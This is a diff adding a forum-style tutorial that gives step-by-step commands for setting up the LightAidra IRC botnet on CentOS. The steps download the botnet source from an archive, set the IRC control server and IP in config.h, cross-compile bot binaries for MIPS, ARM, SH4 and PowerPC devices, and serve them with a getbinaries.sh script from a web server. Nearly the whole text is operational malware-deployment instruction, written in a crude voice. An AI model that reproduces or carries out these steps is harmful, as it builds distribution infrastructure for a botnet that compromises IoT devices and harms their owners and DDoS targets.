@@ -1,0 +1,62 @@
+Getting tired of a bunch of little kids fucking running around saying "How do you steup LightAidra Exploit" Etc... 
+
+Well first let me clarify a few things.
+
+LightAidra is NOT an Exploit. It is a bot. That being said this tutorial will cover CONFIGURING AND UPLOADING THE BOT TO YOUR HTTP, NOT PULL ANY ACTUAL BOTS, THAT WILL HAVE TO WAIT.
+
+Okay so i am not very good at doing steps sadly so you i'll just put every command to run in order. 
+
+_____
+
+(CentOS)
+
+(also cant post links yet but you will know what to edit in the actual links)
+yum update -y
+
+yum install gcc nano make wget unzip -y
+
+wget (http)://0xplanet(dot)com/archive/Botnets/LightHydra/lightaidra-master.zip
+
+unzip lightaidra-master.zip
+
+cd lightaidra-master
+
+cd include
+
+nano config.h (now that you are editing config.h you want to look for line 11 and edit it to your IRC info, after that look for line 34 and chage the referance http to your servers IP) After that save the file and go back to /root/lightaidra-master
+
+mkdir bin 
+
+cd bin 
+
+wget (http)://uclibc(dot)org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
+wget (http)://uclibc(dot)org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+wget (http)://uclibc(dot)org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+wget (http)://uclibc(dot)org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+wget (http)://uclibc(dot)org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+
+tar -xvf cross-compiler-armv5l.tar.bz2
+tar -xvf cross-compiler-mips.tar.bz2
+tar -xvf cross-compiler-mipsel.tar.bz2
+tar -xvf cross-compiler-sh4.tar.bz2
+tar -xvf cross-compiler-powerpc.bz2
+
+cd ..
+
+make mips mipsel arm sh4 ppc 
+
+yum install httpd -y 
+
+nano getbinaries.sh (edit the IP address at the top to your servers IP once again)
+
+cd bin (and you should see all your compiled files)
+
+mv mips mipsel arm sh4 ppc /var/www/html
+
+cd .. 
+
+mv getbinaries.sh /var/www/html
+
+Now we need to run 'restorecon -r /var/www/html' 
+
+And you have successfully setup LightAidra.
